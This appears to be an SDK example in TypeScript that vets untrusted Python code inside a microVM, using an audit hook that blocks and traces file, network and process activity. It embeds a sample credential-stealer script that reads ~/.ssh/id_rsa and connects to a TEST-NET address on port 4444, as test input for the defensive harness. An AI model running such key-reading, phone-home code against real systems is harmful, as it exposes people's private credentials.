/**
 * Sandbox: see what untrusted code DOES before you trust it.
 *
 * Runs an untrusted script in a fresh microVM under a Python audit hook
 * (sys.addaudithook, built into 3.8+) that also GATES: file opens outside the
 * Python install and the target file itself, all network activity, and all
 * subprocess/exec calls are denied by raising in the hook, not just recorded —
 * with no tools to install in the VM. This is the core of a "run it somewhere
 * safe and tell me if it's sketchy" workflow.
 *
 * The gate is not a boundary on its own, and this example does not claim it is:
 * audit events only fire for Python-level API calls. Code that drops to native
 * calls through ctypes (or a compiled extension) generates no events at all —
 * it is neither gated nor traced. The README demonstrates that bypass against
 * a canary file. The microVM is the actual security boundary; the hook is a
 * tripwire and an evidence recorder inside it, never a reason to let untrusted
 * code run anywhere real secrets are reachable.
 */
import { SolariClient } from "@solarisdk/sdk"

// The untrusted code we want to vet. This one behaves like a credential stealer:
// it reads an SSH key and tries to phone home. Harmless here — the key is absent
// and the address is a reserved TEST-NET IP that goes nowhere.
const UNTRUSTED = `
import os, socket
try:
    open(os.path.expanduser("~/.ssh/id_rsa")).read()
except OSError:
    pass
try:
    socket.create_connection(("203.0.113.10", 4444), 0.5)
except OSError:
    pass
print("hello from the untrusted script")
`

// The harness runs the target under an audit hook and prints a JSON trace after
// a marker. The hook is deny-by-default, not observe-only: raising inside an
// audit hook aborts the operation, so a gated event is recorded AND refused.
// File opens under the Python install dir (and of the target file itself) are
// allowed through untraced — imports need them and they are noise; everything
// else sensitive is blocked. Native calls via ctypes raise no audit events,
// so they slip past gate and trace alike (see the README) — the VM, not this
// hook, is the boundary.
const HARNESS = `
import sys, json, io, runpy, traceback
EV = []
STD = tuple(p for p in (sys.prefix, sys.base_prefix) if p)
TARGET = "/tmp/target.py"
ACTIVE = False
def allowed_file(p):
    return isinstance(p, str) and (p == TARGET or p.startswith(STD) or "site-packages" in p)
def hook(event, args):
    if not ACTIVE: return
    cat = None
    if event == "open":
        if allowed_file(args[0] if args else ""): return
        cat = "file"
    elif event == "socket.__new__":
        return
    elif event.startswith(("socket.", "urllib.")):
        cat = "network"
    elif event.startswith(("subprocess.", "os.exec")) or event in ("os.system", "os.posix_spawn", "os.fork", "os.forkpty"):
        cat = "process"
    if cat:
        EV.append({"category": cat, "event": event, "detail": ", ".join(repr(a)[:80] for a in args), "blocked": True})
        raise PermissionError("sandbox-scan policy: " + event + " denied")
sys.addaudithook(hook)
buf, real = io.StringIO(), sys.stdout
sys.stdout = buf
err = None
pending = None
ACTIVE = True
try:
    runpy.run_path(TARGET, run_name="__main__")
except SystemExit:
    pass
except BaseException as e:
    pending = e
finally:
    ACTIVE = False
    sys.stdout = real
# Format the error only after the gate is off: traceback rendering reads the
# source files of the frames it prints, and those reads are the harness's own,
# not the target's — they must not land in the trace as target actions.
if pending is not None:
    err = "".join(traceback.format_exception(pending))
print("@@TRACE@@" + json.dumps({"events": EV, "stdout": buf.getvalue(), "error": err}))
`

const pt = new SolariClient({ apiKey: process.env.SOLARI_API_KEY! })

const sandbox = await pt.sandboxes.create({
  template: "base",
  // Rolling IDLE window — it resets on every use, it is not a hard deadline.
  timeoutMs: 5 * 60_000,
})
console.log("sandbox:", sandbox.sandboxId)

try {
  await sandbox.connect()
  await sandbox.files.write("/tmp/target.py", UNTRUSTED)
  await sandbox.files.write("/tmp/harness.py", HARNESS)

  // Run the harness, never the target directly — the harness installs the audit
  // hook first, then executes the untrusted code.
  const out = await sandbox.commands.run("python3", { args: ["/tmp/harness.py"] })

  const marker = out.stdout.lastIndexOf("@@TRACE@@")
  const trace = JSON.parse(out.stdout.slice(marker + "@@TRACE@@".length)) as {
    events: { category: string; event: string; detail: string; blocked?: boolean }[]
    stdout: string
    error: string | null
  }

  console.log(`\nsensitive actions attempted: ${trace.events.length} (all blocked by the hook)`)
  for (const e of trace.events) {
    console.log(`  ${e.category.padEnd(7)} ${e.event.padEnd(22)} ${e.detail}${e.blocked ? "  [BLOCKED]" : ""}`)
  }
  console.log("\nits own output  :", trace.stdout.trim())
  if (trace.error) console.log("it also threw   :", trace.error.trim().split("\n").at(-1))
} finally {
  // kill() destroys the VM. close() alone would leave it running until the idle timeout.
  await sandbox.kill()
}
